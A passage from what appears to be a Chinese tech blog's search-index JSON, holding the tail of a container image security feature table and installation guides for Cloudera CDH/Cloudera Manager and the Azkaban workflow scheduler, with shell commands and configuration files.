Harbor 集成\n:heavy_check_mark:\n:heavy_check_mark:\n\n\n系统软件包漏洞扫描\n:heavy_check_mark:\n:heavy_check_mark:\n\n\n开源组件漏洞扫描\n\n:heavy_check_mark:\n\n\n恶意软件扫描\n\n:heavy_check_mark:\n\n\n敏感数据扫描\n\n:heavy_check_mark:\n\n\n镜像配置检查\n\n:heavy_check_mark:\n\n\n镜像历史行为分析\n\n:heavy_check_mark:\n\n\n阻止非信任镜像运行\n\n:heavy_check_mark:\n\n\n运行时保护\n\n:heavy_check_mark:\n\n\n合规检查\n\n:heavy_check_mark:\n\n\n","slug":"容器镜像安全-Habor-scanner","date":"2021-04-05T18:16:02.000Z","categories_index":"Cloud-Native-Security","tags_index":"镜像安全,云原生安全,容器安全平台,产品选型,harbor","author_index":"Moses"},{"id":"1a2332bedd5393f913279007dced6f6f","title":"CDH构建大数据平台-使用自建的镜像地址安装Cloudera Manager","content":"CDH构建大数据平台-使用自建的镜像地址安装Cloudera Manager\n一、简介目前Hadoop发行版非常多，有华为发行版、Intel发行版、Cloudera发行版(CDH)、Hortonworks版本（HDP）等，所有这些发行版均是基于Apache Hadoop衍生出来的，之所以有这么多的版本，完全是由Apache Hadoop的开源协议决定的：任何人可以对其进行修改，并作为开源或商业产品发布&#x2F;销售。CDH (Cloudera’s Distribution, including Apache Hadoop)，是Hadoop众多分支中的一种，由Cloudera维护，基于稳定版本的Apache Hadoop构建，并集成了很多补丁，可直接用于生产环境。   \n\n\n\n\n\n\n\n\n\n从2021年1月31日开始，所有Cloudera软件都需要有效的订阅，并且只能通过付费墙进行访问。即目前Apache社区版本外均采用商业付费模式。但社区版在版本管理、部署运维、生态即安全方面还有很多不足之处，故本文意在通过自建镜像方式部署CDH版本Hadoop\n1.环境准备1.1主机资源准备测试环境采用Mac本地部署虚拟机方式安装3台centos7基础web服务器。 \n最小配置为： \n- Hadoop01（CM-server|Agent）内存最小4G推荐12-16G；\n- Hadoop02（Agent）内存最小4G推荐8-16G；  \n- Hadoop03（Agent）内存最小4G推荐8-16G；\n1.2系统环境准备\n网络配置：所有节点使用静态IP\n主机名：修改所有节点主机名并加入到hosts文件\n防火墙关闭：systemctl stop firewalld &amp;&amp; systemctl disable firewalld \nselinux关闭：sed -i ‘s&#x2F;^SELINUX&#x3D;.&#x2F;SELINUX&#x3D;disabled&#x2F;‘ &#x2F;etc&#x2F;selinux&#x2F;config &amp;&amp; setenforce 0 \nNTP时间同步：虚拟机可选择相同时区即可，生产环境配置局区域内NTP    \nSSH免密登录：所有节点分别执行ssh-keygen -t rsa、ssh-copy-id -i &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub root@hadoop[01-03]\n设置文件打开数据和用户最大进程数：通过修改limits.conf进行优化\n\n1.3安装包与依赖所有节点安装：yum -y install chkconfig python bind-utils psmisc libxslt zlib sqlite cyrus-sasl-plain cyrus-sasl-gssapi fuse fuse-libs redhat-lsb postgresql portmap mod_ssl openssl-devel python-psycopg2 MySQL-python\n2.搭建私仓cm-server或者任意一台同局域网同网段内服务安装web服务并启动，yum -y install httpd &amp;&amp; systemctl start httpd;下载对应的CM资源到web目录，下载地址：http://ro-bucharest-repo.bigstepcloud.com/cloudera-repos/创建repodata数据文件，yum -y install createrepo &amp;&amp; cd /var/www/html/cm-6.2.0/ &amp;&amp; createrepo .创建本地yum文件cloudra-manager.repo，并将文件放置在私仓web目录。\n# Packages for Cloudera Manager, Version 5, on RedHat or CentOS 7 x86_64                  \nname&#x3D;Cloudera Manager\nbaseurl&#x3D;http:&#x2F;&#x2F;172.16.3.109&#x2F;cm-6.2.0&#x2F;\ngpgkey &#x3D;http:&#x2F;&#x2F;172.16.3.109&#x2F;cm-6.2.0&#x2F;RPM-GPG-KEY-cloudera    \nenabled &#x3D; 1\ngpgcheck &#x3D; 0\n配置集群本地yum源，mkdir /etc/yum.repos.d/repo-backup &amp;&amp; mv /etc/yum.repos.d/*.rpo repo-backup\n部署CM-server1&gt;安装MySQL数据库，测试单台5.6正式可使用主从5.7MySQL5.6.51安装指导详见https://blog.csdn.net/yy8623977/article/details/1180903712&gt;配置元数据库详见https://www.cnblogs.com/yinzhengjie/articles/10384065.html3&gt;配置CM\nsed -i s&#39;[[Xmx2G]][[Xmx4G]]#&#39; &#x2F;etc&#x2F;default&#x2F;cloudera-scm-server &amp;&amp; grep CMF_JAVA_OPTS &#x2F;etc&#x2F;default&#x2F;cloudera-scm-server \nexport CMF_JAVA_OPTS&#x3D;&quot;-Xmx4G -XX:MaxPermSize&#x3D;256m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath&#x3D;&#x2F;tmp&quot; \n4&gt;初始化数据库,/opt/cloudera/cm/schema/scm_prepare_database.sh mysql scm scm moses &amp;&amp; systemctl start cloudera-scm-server\n部署CM-Agent节点安装依赖包，更换本地yum源安装CM-Agent，配置config.ini文件的CM地址。\nHDFS服务安装时报错：su - hdfs &amp;&amp; hdfs dfsadmin -safemode leave\n","slug":"CDH构建大数据平台-使用自建的镜像地址安装Cloudera Manager","date":"2020-10-23T04:53:03.000Z","categories_index":"大数据","tags_index":"Hadoop,Cloudera,大数据","author_index":"Moses"},{"id":"6b3a3497e1eeebd4a65d0ba4c26e41db","title":"手动安装CDH6.1","content":"手工安装仓库# 官方Parcels仓库： \n# https:&#x2F;&#x2F;archive.cloudera.com&#x2F;cdh6&#x2F;6.1.0&#x2F;parcels&#x2F;\n#\n# Cloudera-Manger仓库：\n# https:&#x2F;&#x2F;archive.cloudera.com&#x2F;cm6&#x2F;6.1.0&#x2F;redhat7&#x2F;yum&#x2F;\n#\n# 内网仓库：\n# http:&#x2F;&#x2F;172.24.26.90:57777&#x2F;cdh&#x2F;6.1.0&#x2F;\n# http:&#x2F;&#x2F;172.24.26.90:57777&#x2F;cloudera-manager&#x2F;6.1.0&#x2F;\n\n# 需要注意，无论使用内网和官方仓库注册都要使用执行，rpm命令注册仓库\n\nrpm --import https:&#x2F;&#x2F;archive.cloudera.com&#x2F;cm6&#x2F;6.1.0&#x2F;redhat7&#x2F;yum&#x2F;RPM-GPG-KEY-cloudera\n\nrpm --import https:&#x2F;&#x2F;archive.cloudera.com&#x2F;cm6&#x2F;6.1.0&#x2F;redhat7&#x2F;yum&#x2F;RPM-GPG-KEY-cloudera\n\n\n安装安装三节点集群。\n\n\n\n主机名\nRole\n备注\n\n\n\nrjbdnode1\ncm、mariadb、agent\n172.24.26.102\n\n\nrjbdnode2\nagent\n172.24.26.103\n\n\nrjbdnode3\nagent\n172.24.26.104\n\n\n前期工作(所有节点)# 关防火墙\nsetenforce 0\nsystemctl stop firewalld\nsystemctl disable firewalld\n\n# 装JDK\n\n安装MariaDByum -y install mariadb-server\nsystemctl enable mariadb\nsystemctl start mariadb\n\n# 执行 &#x2F;usr&#x2F;bin&#x2F;mysql_secure_installation 初始化化数据库\n\n# 执行以下sql允许root用户远程访问\n# GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;rjbigdata&#39; WITH GRANT OPTION;\n\n# 执行以下SQL创建DB\n# CREATE DATABASE scm DEFAULT CHARACTER SET utf8 DEFAULT COLLATE utf8_general_ci;\n\n注意：Cloudera 给出了一个MariaDB的官方推荐配置，请参考。\n安装Cloudera应用# 所有节点安装mysql的JDBC驱动，执行以下代码\n\nwget https:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;Downloads&#x2F;Connector-J&#x2F;mysql-connector-java-5.1.47.tar.gz\ntar zxvf mysql-connector-java-5.1.47.tar.gz\nmkdir -p &#x2F;usr&#x2F;share&#x2F;java&#x2F;\ncd mysql-connector-java-5.1.47\ncp mysql-connector-java-5.1.47-bin.jar &#x2F;usr&#x2F;share&#x2F;java&#x2F;mysql-connector-java.jar\n\n# 安装rjbdnode1 执行\nyum install -y  cloudera-manager-server\n# 在rjbdnode1 同步数据库配置\n&#x2F;opt&#x2F;cloudera&#x2F;cm&#x2F;schema&#x2F;scm_prepare_database.sh mysql -h rjbdnode1 --scm-host rjbdnode1 scm root rjbigdata\n# 启动CM\nsystemctl enable cloudera-scm-server\nsystemctl start cloudera-scm-server\n\n# 所有节点执行以下操作\nyum install -y  cloudera-manager-agent\n# 修改 &#x2F;etc&#x2F;cloudera-scm-agent&#x2F;config.ini 中的 server_host 为 rjbdnode1\n\n# 启动AGENT\nsystemctl enable cloudera-scm-agent\nsystemctl start cloudera-scm-agent\n\n创建集群登录CM创建集群，略。\n","slug":"手动安装CDH6.1.md","date":"2020-10-20T09:53:00.000Z","categories_index":"大数据","tags_index":"Hadoop,Cloudera,大数据","author_index":"Moses"},{"id":"f6f3c3a5d4505ac58f98c7a3b8694668","title":"azkaban安装","content":"Centos7安装AzkabanCentos7安装Gradle1.下载Gradle安装包\nwget https:&#x2F;&#x2F;downloads.gradle.org&#x2F;distributions&#x2F;gradle-3.2.1-all.zip\n2.新建版本目录并解压安装\nmkdir &#x2F;opt&#x2F;gradle\nunzip -d &#x2F;opt&#x2F;gradle gradle-4.10.3-all.zip\n3.配置环境变量\nvi ~&#x2F;.bash_profile\nexport PATH&#x3D;$PATH:&#x2F;opt&#x2F;gradle&#x2F;gradle-4.10.3&#x2F;bin\nsource ~&#x2F;.bash_profile\ngradle -v\n4.配置全局变量替换源\nvi ~&#x2F;.gradle&#x2F;init.gradle\nallprojects&#123;\n    repositories &#123;\n        def ALIYUN_REPOSITORY_URL &#x3D; &#39;https:&#x2F;&#x2F;maven.aliyun.com&#x2F;repository&#x2F;public&#x2F;&#39;\n        def ALIYUN_JCENTER_URL &#x3D; &#39;https:&#x2F;&#x2F;maven.aliyun.com&#x2F;repository&#x2F;jcenter&#x2F;&#39;\n        def ALIYUN_GOOGLE_URL &#x3D; &#39;https:&#x2F;&#x2F;maven.aliyun.com&#x2F;repository&#x2F;google&#x2F;&#39;\n        def ALIYUN_GRADLE_PLUGIN_URL &#x3D; &#39;https:&#x2F;&#x2F;maven.aliyun.com&#x2F;repository&#x2F;gradle-plugin&#x2F;&#39;\n        all &#123; ArtifactRepository repo -&gt;\n            if(repo instanceof MavenArtifactRepository)&#123;\n                def url &#x3D; repo.url.toString()\n                if (url.startsWith(&#39;https:&#x2F;&#x2F;repo1.maven.org&#x2F;maven2&#x2F;&#39;)) &#123;\n                    project.logger.lifecycle &quot;Repository $&#123;repo.url&#125; replaced by $ALIYUN_REPOSITORY_URL.&quot;\n                    remove repo\n                &#125;\n                if (url.startsWith(&#39;https:&#x2F;&#x2F;jcenter.bintray.com&#x2F;&#39;)) &#123;\n                    project.logger.lifecycle &quot;Repository $&#123;repo.url&#125; replaced by $ALIYUN_JCENTER_URL.&quot;\n                    remove repo\n                &#125;\n                if (url.startsWith(&#39;https:&#x2F;&#x2F;dl.google.com&#x2F;dl&#x2F;android&#x2F;maven2&#x2F;&#39;)) &#123;\n                    project.logger.lifecycle &quot;Repository $&#123;repo.url&#125; replaced by $ALIYUN_GOOGLE_URL.&quot;\n                    remove repo\n                &#125;\n                if (url.startsWith(&#39;https:&#x2F;&#x2F;plugins.gradle.org&#x2F;m2&#x2F;&#39;)) &#123;\n                    project.logger.lifecycle &quot;Repository $&#123;repo.url&#125; replaced by $ALIYUN_GRADLE_PLUGIN_URL.&quot;\n                    remove repo\n                &#125;\n            &#125;\n        &#125;\n        maven &#123; url ALIYUN_REPOSITORY_URL &#125;\n        maven &#123; url ALIYUN_JCENTER_URL &#125;\n        maven &#123; url ALIYUN_GOOGLE_URL &#125;\n        maven &#123; url ALIYUN_GRADLE_PLUGIN_URL &#125;\n    &#125;\n&#125;\n5.gradlew和gradle命令的区别Gradlew是包装器，自动下载包装器里定义好的gradle 版本，保证编译环境统一，gradle 是用本地的gradle版本。Wrapper (gradlew)\n安装AzkanbanAZkanban前期知识准备1.介绍\nAzkaban是由Linkedin公司推出的一个批量工作流任务调度器，主要用于在一个工作流内以一个特定的顺序运行一组工作和流程，它的配置是通过简单的key:value对的方式，通过配置中的dependencies 来设置依赖关系(依赖必须是一个DAG)。\nAzkaban使用job配置文件建立任务之间的依赖关系，并提供一个易于使用的web用户界面维护和跟踪你的工作流。\nAzkaban官网：https:&#x2F;&#x2F;azkaban.github.io&#x2F;\n2.Azkanban的特点\n1.功能强大，可以调度几乎所有软件的执行，提供模块化和可插拔的插件机制，原生支持command、Java、Hive、Pig、Hadoop；\n2.基于Java开发，代码结构清晰，易于二次开发；\n3.简单易用的Web用户界面，可以监控每一个步骤；\n4.提供job配置文件快速建立任务和任务之间的依赖关系；\n5.提供了Restful接口，方便我们平台进行定制化调用。\n3.Azkaban的架构\nAzkaban由三个关键组件构成：\n  1.关系型数据库（MySQL）:用于保存工作流相关信息；\n  2.AzkabanWebServer: 整个 Azkaban 工作流系统的主要管理者，它用于用户登录认证、负责 project 管理、定时执行工作流、跟踪工作流执行进度等一系列任务；\n  3.AzkabanExecutorServer: 负责具体的工作流的调度提交。\n4.Azkaban的三大模块\nazkaban有三大模块,azkaban-common,azkaban-exec-server,azkaban-web-server.\n  azkaban-common：是公共模块,比如访问数据库,trigger管理工具,邮件工具,以及job.\n  azkaban-exec-server：是执行器,主要用于执行任务\n  azkaban-web-server：是调度中心,用于任务展示、编辑,调度任务\n5.部署模式\nsolo-server模式:\nDB使用的是一个内嵌的H2，Web Server和Executor Server运行在同一个进程里。这种模式包含Azkaban的所有特性，但一般用来学习和测试。\n\ntwo-server模式:\nDB使用的是MySQL，MySQL支持master-slave架构，Web Server和Executor Server运行在不同的进程中。\n\n分布式multiple-executor模式:\nDB使用的是MySQL，MySQL支持master-slave架构，Web Server和Executor Server运行在不同机器上，且有多个Executor Server。\n编译安装1.编译\ngit clone https:&#x2F;&#x2F;github.com&#x2F;azkaban&#x2F;azkaban.git [[clone]] the repo\ncd azkaban; sh .&#x2F;gradlew build  [[build]] &amp; install package\n.&#x2F;gradlew clean \n.&#x2F;gradlew installDist\n.&#x2F;gradlew test\n.&#x2F;gradlew build -x test\n\ncd azkaban-solo-server&#x2F;build&#x2F;install&#x2F;azkaban-solo-server; bin&#x2F;start-solo.sh [[start]] solo server \nbin&#x2F;shutdown-solo.sh  [[stop]] \n2.使用编译好的文件进行安装节点准备：   \n\nweb-serve：172.16.3.109  \nexecutor-server：172.16.3.179  \nDB-server：172.16.3.123编译后文件上传并解压：azkaban-web-server    mkdir opt&#x2F;azkaban\ncd azkaban\ntar -zxvf azkaban-web-server-0.1.0-SNAPSHOT.tar.gz\ntar -zxvf azkaban-db-0.1.0-SNAPSHOT.tar.gz\nmv azkaban-db-0.1.0-SNAPSHOT azkaban-db\nmv azkaban-web-server-0.1.0-SNAPSHOT azkaban-web-server\nexcutor-server      mkdir azkaban\ncd azkaban\ntar -zxvf azkaban-exec-server-0.1.0-SNAPSHOT.tar.gz\nmv azkaban-exec-server-0.1.0-SNAPSHOT azkaban-exec-server\nDB-server   mysql&gt; CREATE DATABASE azkaban;\nmysql&gt; use azkaban;\nmysql&gt; source &#x2F;opt&#x2F;azkaban&#x2F;azkaban-db&#x2F;create-all-sql-0.1.0-SNAPSHOT.sql; [[工具导入失败建议使用SQL]]语句导入\ninsert into executors(host,port,active) values(&#39;172.16.3.179&#39;,12331,1);\n3.Executor端Server安装[root@kdc conf]# cat azkaban.properties\n# Azkaban Personalization Settings\nazkaban.name&#x3D;Test\nazkaban.label&#x3D;My Local Azkaban\nazkaban.color&#x3D;[[FF3601]]\nazkaban.default.servlet.path&#x3D;&#x2F;index\nweb.resource.dir&#x3D;web&#x2F;\ndefault.timezone.id&#x3D;America&#x2F;Los_Angeles\n# Azkaban UserManager class\nuser.manager.class&#x3D;azkaban.user.XmlUserManager\nuser.manager.xml.file&#x3D;conf&#x2F;azkaban-users.xml\n# Loader for projects\nexecutor.global.properties&#x3D;conf&#x2F;global.properties\nazkaban.project.dir&#x3D;projects\n# Velocity dev mode\nvelocity.dev.mode&#x3D;false\n# Azkaban Jetty server properties.\njetty.use.ssl&#x3D;false\njetty.maxThreads&#x3D;25\njetty.port&#x3D;8081\n# Where the Azkaban web server is located\nazkaban.webserver.url&#x3D;http:&#x2F;&#x2F;172.16.3.109:8081\n# mail settings\nmail.sender&#x3D;\nmail.host&#x3D;\n# User facing web server configurations used to construct the user facing server URLs. They are useful when there is a reverse proxy between Azkaban web servers and users.\n# enduser -&gt; myazkabanhost:443 -&gt; proxy -&gt; localhost:8081\n# when this parameters set then these parameters are used to generate email links.\n# if these parameters are not set then jetty.hostname, and jetty.port(if ssl configured jetty.ssl.port) are used.\n# azkaban.webserver.external_hostname&#x3D;myazkabanhost.com\n# azkaban.webserver.external_ssl_port&#x3D;443\n# azkaban.webserver.external_port&#x3D;8081\njob.failure.email&#x3D;\njob.success.email&#x3D;\nlockdown.create.projects&#x3D;false\ncache.directory&#x3D;cache\n# JMX stats\njetty.connector.stats&#x3D;true\nexecutor.connector.stats&#x3D;true\n# Azkaban plugin settings\nazkaban.jobtype.plugin.dir&#x3D;plugins&#x2F;jobtypes\n# Azkaban mysql settings by default. Users should configure their own username and password.\ndatabase.type&#x3D;mysql\nmysql.port&#x3D;3306\nmysql.host&#x3D;172.16.3.123\nmysql.database&#x3D;azkabab\nmysql.user&#x3D;root\nmysql.password&#x3D;root\nmysql.numconnections&#x3D;100\n# Azkaban Executor settings\nexecutor.maxThreads&#x3D;50\nexecutor.flow.threads&#x3D;30\nexecutor.port&#x3D;12331\nexecutor.connector.stats&#x3D;true\nexecutor.maxThreads&#x3D;50\nexecutor.flow.threads&#x3D;30\nexecution.logs.retention.ms&#x3D;2419200000\n4.启动executor服务注意：启动顺序一定是先启动azkaban-exec-server，再启动azkaban-web-server.&#x2F;bin&#x2F;start-web.sh [[一定要在bin]]文件的上一层目录进行启动\ntail -f executorServerLog_*.out #查看启动日志\njps #查看进程\ncurl -G &quot;localhost:12331&#x2F;executor?action&#x3D;activate&quot; &amp;&amp; echo [[手动激活executor]]\n5.Web端Server安装 [[配置azkaban]].properties文件\ncat azkaban.properties\n# Azkaban Personalization Settings\nazkaban.name&#x3D;Test\nazkaban.label&#x3D;My Local Azkaban\nazkaban.color&#x3D;[[FF3601]]\nazkaban.default.servlet.path&#x3D;&#x2F;index\nweb.resource.dir&#x3D;web&#x2F;\ndefault.timezone.id&#x3D;America&#x2F;Los_Angeles\n# Azkaban UserManager class\nuser.manager.class&#x3D;azkaban.user.XmlUserManager\nuser.manager.xml.file&#x3D;conf&#x2F;azkaban-users.xml\n# Loader for projects\nexecutor.global.properties&#x3D;conf&#x2F;global.properties\nazkaban.project.dir&#x3D;projects\n# Velocity dev mode\nvelocity.dev.mode&#x3D;false\n# Azkaban Jetty server properties.\njetty.use.ssl&#x3D;false\njetty.maxThreads&#x3D;25\njetty.port&#x3D;8081\n# Azkaban Executor settings\n# mail settings\nmail.sender&#x3D;\nmail.host&#x3D;\n# User facing web server configurations used to construct the user facing server URLs. They are useful when there is a reverse proxy between Azkaban web servers and users.\n# enduser -&gt; myazkabanhost:443 -&gt; proxy -&gt; localhost:8081\n# when this parameters set then these parameters are used to generate email links.\n# if these parameters are not set then jetty.hostname, and jetty.port(if ssl configured jetty.ssl.port) are used.\n# azkaban.webserver.external_hostname&#x3D;myazkabanhost.com\n# azkaban.webserver.external_ssl_port&#x3D;443\n# azkaban.webserver.external_port&#x3D;8081\njob.failure.email&#x3D;\njob.success.email&#x3D;\nlockdown.create.projects&#x3D;false\ncache.directory&#x3D;cache\n# JMX stats\njetty.connector.stats&#x3D;true\nexecutor.connector.stats&#x3D;true\n# Azkaban mysql settings by default. Users should configure their own username and password.\ndatabase.type&#x3D;mysql\nmysql.port&#x3D;3306\nmysql.host&#x3D;172.16.3.123\nmysql.database&#x3D;azkaban\nmysql.user&#x3D;root\nmysql.password&#x3D;root\nmysql.numconnections&#x3D;100\n[[Multiple]] Executor\nazkaban.use.multiple.executors&#x3D;true\nazkaban.executorselector.filters&#x3D;StaticRemainingFlowSize,MinimumFreeMemory,CpuStatus\nazkaban.executorselector.comparator.NumberOfAssignedFlowComparator&#x3D;1\nazkaban.executorselector.comparator.Memory&#x3D;1\nazkaban.executorselector.comparator.LastDispatched&#x3D;1\nazkaban.executorselector.comparator.CpuUsage&#x3D;1\n启动web服务注意：启动顺序一定是先启动azkaban-exec-server，再启动azkaban-web-server.&#x2F;bin&#x2F;start-web.sh [[一定要在bin]]文件的上一层目录进行启动\ntail -f executorServerLog_*.out #查看启动日志\njps #查看进程\n配置jetty ssl  # keytool -keystore keystore -alias jetty -genkey -keyalg RSA\n \nEnter keystore password:\n \nRe-enter new password:\n \nWhat is your first and last name?\n \n[Unknown]: YY\n \nWhat is the name of your organizational unit?\n \n[Unknown]: YY\n \nWhat is the name of your organization?\n \n[Unknown]: YY\n \nWhat is the name of your City or Locality?\n \n[Unknown]: Beijing\n \nWhat is the name of your State or Province?\n \n[Unknown]: Beijing\n \nWhat is the two-letter country code for this unit?\n \n[Unknown]: CN\n \nIs CN&#x3D;YY, OU&#x3D;YY, O&#x3D;YY, L&#x3D;shanghai, ST&#x3D;shanghai, C&#x3D;CN correct?\n \n[no]: y\n将生成的keystone文件拷贝到web-server的安装目录下，和conf等目录同级修改conf&#x2F;azkaban.properties配置文件  [[cat]] azkaban.properties\n \n# Azkaban Personalization Settings\n \nazkaban.name&#x3D;Test [[服务器UI]]名称，用于服务器上方显示的名字\n \nazkaban.label&#x3D;My Local Azkaban #描述\n \nazkaban.color&#x3D;[[FF3601]] [[UI]]颜色\n \nazkaban.default.servlet.path&#x3D;&#x2F;index\n \nweb.resource.dir&#x3D;web&#x2F; [[默认根web]]目录\n \ndefault.timezone.id&#x3D;Asia&#x2F;Shanghai #默认时区，已改为亚洲&#x2F;上海\n \n# Azkaban UserManager class\n \nuser.manager.class&#x3D;azkaban.user.XmlUserManager #用户权限管理默认类\n \nuser.manager.xml.file&#x3D;conf&#x2F;azkaban-users.xml #用户配置，具体配置参见下文\n \n# Loader for projects\n \nexecutor.global.properties&#x3D;conf&#x2F;global.properties [[globa]]配置文件所在位置\n \nazkaban.project.dir&#x3D;projects\n \n \n \n# Velocity dev mode\n \nvelocity.dev.mode&#x3D;false\n \n# Azkaban Jetty server properties. [[jetty]]服务器属性\n \njetty.maxThreads&#x3D;25 #最大线程数\n \njetty.ssl.port&#x3D;8443 [[jetty]] ssl端口号\n \njetty.port&#x3D;8081 [[jetty]]端口\n \njetty.keystore&#x3D;keystore [[SSL]]文件名\n \njetty.password&#x3D;bigdata@123 [[SSL]]文件密码\n \njetty.keypassword&#x3D;bigdata@123 [[jetty主密码与keystore]]文件相同\n \njetty.truststore&#x3D;keystore [[SSL]]文件名\n \njetty.trustpassword&#x3D;bigdata@123 [[SSL]]文件密码\n \n# Azkaban Executor settings\n \nexecutor.port&#x3D;12321 #执行服务器端口\n \n# mail settings #邮件配置（暂没有配置）\n \nmail.sender&#x3D; #发送邮箱\n \nmail.host&#x3D; [[发送邮箱smtp]]地址\n \nmail.password&#x3D; #邮箱密码\n \njob.failure.email&#x3D; #任务失败时发送邮件的地址\n \njob.success.email&#x3D; #任务成功时发送邮件的地址\n \nlockdown.create.projects&#x3D;false\n \ncache.directory&#x3D;cache #缓存目录\n \n# JMX stats\n \njetty.connector.stats&#x3D;true\n \nexecutor.connector.stats&#x3D;true\n \n# Azkaban plugin settings\n \nazkaban.jobtype.plugin.dir&#x3D;plugins&#x2F;jobtypes\n \n \n \ndatabase.type&#x3D;mysql #数据库类型\n \nmysql.port&#x3D;3306 #数据库端口号\n \nmysql.host&#x3D;172.31.217.173 #数据库连接地址\n \nmysql.database&#x3D;azkaban #数据库实例名\n \nmysql.user&#x3D;azkaban #数据库用户名\n \nmysql.password&#x3D;bigdata@123 #数据库密码\n \nmysql.numconnections&#x3D;100 #数据库最大连接数\n \nazkaban.use.multiple.executors&#x3D;true\n \nazkaban.executorselector.filters&#x3D;StaticRemainingFlowSize,MinimumFreeMemory,CpuStatus\n \nazkaban.executorselector.comparator.NumberOfAssignedFlowComparator&#x3D;1\n \nazkaban.executorselector.comparator.Memory&#x3D;1\n \nazkaban.executorselector.comparator.LastDispatched&#x3D;1\n \nazkaban.executorselector.comparator.CpuUsage&#x3D;1\n\n\n参考资料Azkaban docgithub项目地址Azkaban3.X（可视化任务调度器）多节点集群部署Azkaban学习azkaban的部署过程中遇到的一些坑（部署篇)hadoop学习笔记7-AzkabanAzkaban任务调度框架的编译与安装\n","slug":"Centos7安装azkaban","date":"2020-08-23T04:53:03.000Z","categories_index":"大数据","tags_index":"大数据,分布式任务调度,Azkaban,安装手册","author_index":"Moses"}]